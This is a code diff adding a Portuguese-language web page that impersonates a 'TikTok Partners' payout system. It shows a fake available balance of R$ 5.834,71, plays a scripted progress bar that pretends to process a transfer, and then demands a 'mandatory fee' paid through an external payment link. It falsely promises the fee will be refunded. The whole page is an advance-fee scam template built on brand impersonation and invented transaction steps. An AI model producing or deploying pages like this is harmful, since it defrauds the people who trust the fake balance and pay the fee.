@@ -1,0 +1,427 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<script
+        src="https://cdn.jsdelivr.net/gh/xTracky/static@latest/utm-handler.js"
+        data-token="b37547bb-ec0c-41df-a0ba-890b47c59feb"
+>
+</script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="max-image-preview:large">
+    <title>Parceiro TikTok - Sistema de Transferências</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet"/>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', 'Poppins', sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #000000 0%, #1a1a1a 100%);
+            color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .login-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            width: 100%;
+        }
+
+        .login-box {
+            background: linear-gradient(135deg, #ffffff 0%, #f8f9fa 100%);
+            padding: 35px;
+            border: 2px solid #FE2B54;
+            width: 100%;
+            max-width: 480px;
+            border-radius: 16px;
+            box-shadow: 0 20px 60px rgba(254, 43, 84, 0.3);
+            text-align: center;
+        }
+
+        .alert-box {
+            font-size: 0.85rem;
+            color: #FF0000;
+            text-align: center;
+            border: 2px solid #FE2B54;
+            padding: 12px 15px;
+            background: rgba(0, 0, 0, 0.9);
+            border-radius: 10px;
+            margin-bottom: 25px;
+            font-weight: 600;
+            line-height: 1.5;
+        }
+
+        .logo {
+            width: 100%;
+            max-width: 400px;
+            height: auto;
+            border-radius: 20px;
+            margin-bottom: 25px;
+            filter: drop-shadow(0 4px 12px rgba(0, 0, 0, 0.3));
+        }
+
+        h3 {
+            color: #000;
+            font-size: 1.3rem;
+            font-weight: 700;
+            margin-bottom: 15px;
+            line-height: 1.4;
+        }
+
+        .description {
+            color: #333;
+            font-size: 0.95rem;
+            line-height: 1.7;
+            margin-bottom: 25px;
+        }
+
+        .description b {
+            color: #FE2B54;
+            font-weight: 700;
+        }
+
+        .saldo-highlight {
+            background: linear-gradient(135deg, rgba(254, 43, 84, 0.1) 0%, rgba(254, 43, 84, 0.05) 100%);
+            border: 2px solid #FE2B54;
+            border-radius: 12px;
+            padding: 15px;
+            margin: 20px 0;
+            text-align: center;
+        }
+
+        .saldo-label {
+            font-size: 0.85rem;
+            color: #666;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+
+        .saldo-valor {
+            font-size: 2rem;
+            font-weight: 700;
+            color: #FE2B54;
+            font-family: 'Inter', sans-serif;
+        }
+
+        .divider {
+            border: 0.5px solid #e0e0e0;
+            margin: 25px 0;
+        }
+
+        .login-btn {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #FE2B54 0%, #d91e4a 100%);
+            border: none;
+            border-radius: 12px;
+            color: #fff;
+            font-weight: 700;
+            margin-top: 10px;
+            cursor: pointer;
+            font-size: 1rem;
+            transition: all 0.3s ease;
+            box-shadow: 0 8px 24px rgba(254, 43, 84, 0.3);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .login-btn:hover {
+            background: linear-gradient(135deg, #d91e4a 0%, #FE2B54 100%);
+            transform: translateY(-2px);
+            box-shadow: 0 12px 32px rgba(254, 43, 84, 0.4);
+        }
+
+        .login-btn:active {
+            transform: translateY(0);
+        }
+
+        .login-btn i {
+            font-size: 1.1rem;
+        }
+
+        .security-badge {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-top: 20px;
+        }
+
+        .security-badge img {
+            width: 100px;
+            height: auto;
+            border-radius: 10px;
+        }
+
+        /* Popup Styles */
+        .popup {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            padding: 20px;
+        }
+
+        .popup-content {
+            background: linear-gradient(135deg, #ffffff 0%, #f8f9fa 100%);
+            padding: 30px;
+            border: 2px solid #FE2B54;
+            border-radius: 16px;
+            text-align: center;
+            width: 100%;
+            max-width: 450px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
+            color: #333;
+        }
+
+        .popup-alert {
+            font-size: 0.85rem;
+            color: #FF0000;
+            text-align: center;
+            border: 2px solid #FE2B54;
+            padding: 12px 15px;
+            background: rgba(254, 43, 84, 0.1);
+            border-radius: 10px;
+            margin-bottom: 20px;
+            font-weight: 600;
+            line-height: 1.5;
+        }
+
+        .popup h2 {
+            color: #FE2B54;
+            font-size: 1.5rem;
+            font-weight: 700;
+            margin-bottom: 20px;
+        }
+
+        .popup p {
+            line-height: 1.8;
+            font-size: 0.95rem;
+            color: #333;
+            margin-bottom: 15px;
+            text-align: left;
+        }
+
+        .popup b {
+            color: #FE2B54;
+            font-weight: 700;
+        }
+
+        .progress-bar {
+            width: 100%;
+            background-color: #e0e0e0;
+            border-radius: 25px;
+            margin: 20px 0;
+            height: 30px;
+            overflow: hidden;
+        }
+
+        .progress {
+            height: 100%;
+            background: linear-gradient(90deg, #FE2B54, #d91e4a);
+            width: 0;
+            border-radius: 25px;
+            transition: width 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #fff;
+            font-weight: 700;
+            font-size: 0.85rem;
+        }
+
+        .custom-button {
+            background: linear-gradient(135deg, #FE2B54 0%, #d91e4a 100%);
+            color: white;
+            padding: 18px 40px;
+            border: none;
+            border-radius: 12px;
+            font-size: 1.05rem;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 8px 24px rgba(254, 43, 84, 0.3);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            width: 100%;
+            max-width: 400px;
+            margin-top: 20px;
+        }
+
+        .custom-button:hover {
+            background: linear-gradient(135deg, #d91e4a 0%, #FE2B54 100%);
+            transform: translateY(-2px);
+            box-shadow: 0 12px 32px rgba(254, 43, 84, 0.4);
+        }
+
+        .custom-button:active {
+            transform: translateY(0);
+        }
+
+        .loader-text {
+            color: #333;
+            font-size: 1rem;
+            font-weight: 600;
+            margin-bottom: 15px;
+        }
+
+        .loader-text b {
+            color: #FE2B54;
+        }
+
+        @media (max-width: 600px) {
+            .login-box {
+                padding: 25px 20px;
+            }
+
+            h3 {
+                font-size: 1.1rem;
+            }
+
+            .description {
+                font-size: 0.9rem;
+            }
+
+            .saldo-valor {
+                font-size: 1.6rem;
+            }
+
+            .popup-content {
+                padding: 25px 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="login-box">
+            <div class="alert-box">
+                <b>ATENÇÃO:</b><br> NÃO FECHE ESTÁ PÁGINA, PARA NÃO PRECISAR REFAZER TODO O PROCESSO NOVAMENTE.
+            </div>
+
+            <img src="images/tt.png" alt="TikTok Logo" class="logo">
+
+            <h3>Bem vindo ao sistema de Transferências <b style="color: #FE2B54;">Parceiros TikTok</b></h3>
+            
+            <p class="description">
+                <b>Parceiro TikTok</b>, seu saldo está disponível para resgate. Clique no botão abaixo para receber seu valor de:
+            </p>
+
+            <div class="saldo-highlight">
+                <div class="saldo-label">Saldo Disponível</div>
+                <div class="saldo-valor">R$ 5.834,71</div>
+            </div>
+
+            <hr class="divider">
+
+            <div style="text-align: center; margin-top: 25px;">
+                <button type="button" class="login-btn" onclick="openPopup()">
+                    <i class="fas fa-unlock"></i>
+                    <span>Resgatar Meu Saque</span>
+                </button>
+            </div>
+
+            <div class="security-badge">
+                <img src="images/siteseguro.webp" alt="Site Seguro">
+            </div>
+        </div>
+    </div>
+
+    <!-- Popup do loader e barra de progresso -->
+    <div id="progressPopup" class="popup">
+        <div class="popup-content">
+            <div class="loader">
+                <p class="loader-text" id="texto1">Analisando resposta <b>TIKTOK</b>, aguarde...</p>
+                <p class="loader-text" id="texto2" style="display:none;">Códigos OK!<br>Transferindo o seu valor <b style="color: #FE2B54;">processando...</b></p>
+                <div class="progress-bar">
+                    <div id="progress" class="progress">0%</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Segundo popup para informar a taxa de transferência -->
+    <div id="taxPopup" class="popup">
+        <div class="popup-content">
+            <div class="popup-alert">
+                <b>ATENÇÃO:</b><br> TAXA OBRIGATÓRIA PAGUE E RECEBA SEU SAQUE IMEDIATAMENTE.
+            </div>
+
+            <h2>ATENÇÃO: Sua Vaga Está Garantida!</h2>
+            
+            <p>
+                Para garantir o pagamento e evitar fraudes, é necessário que você se cadastre no sistema <b>Parceiros TikTok</b>. Para isso, cobramos uma <b>Última Taxa Para Receber agora</b>, que valida sua <b>CHAVE PIX</b> e garante a transferência segura para sua conta.
+            </p>
+
+            <p>
+                Após o pagamento, você terá acesso ao aplicativo e poderá sacar <b>R$ 5.834,71</b>.
+            </p>
+
+            <p>
+                <b style="color: #FE2B54;">Importante:</b> O valor da taxa será <b>totalmente devolvido</b> após a confirmação do seu cadastro!
+            </p>
+
+            <button class="custom-button" onclick="window.location.href='https://go.zeroonepay.com.br/dnwmzufnhb' + window.location.search;">
+                <i class="fas fa-lock"></i>
+                DESBLOQUEAR MEU SAQUE
+            </button>
+        </div>
+    </div>
+
+    <script>
+        function openPopup() {
+            var popup = document.getElementById("progressPopup");
+            var progressBar = document.getElementById("progress");
+            var taxPopup = document.getElementById("taxPopup");
+            var texto1 = document.getElementById("texto1");
+            var texto2 = document.getElementById("texto2");
+
+            // Exibe o primeiro popup (barra de progresso)
+            popup.style.display = "flex";
+
+            // Anima a barra de progresso
+            var width = 0;
+            var interval = setInterval(function() {
+                if (width == 50) {
+                    // Quando completar 50%, esconde o texto1 e mostra o texto2
+                    texto1.style.display = "none";
+                    texto2.style.display = "block";
+                } 
+                if (width >= 100) {
+                    clearInterval(interval);
+                    // Quando completar 100%, fecha o primeiro popup e abre o segundo
+                    popup.style.display = "none";
+                    taxPopup.style.display = "flex";
+                } else {
+                    width++;
+                    progressBar.style.width = width + '%';
+                    progressBar.textContent = width + '%';
+                }
+            }, 50);
+        }
+
+    </script>
+</body>
+</html>
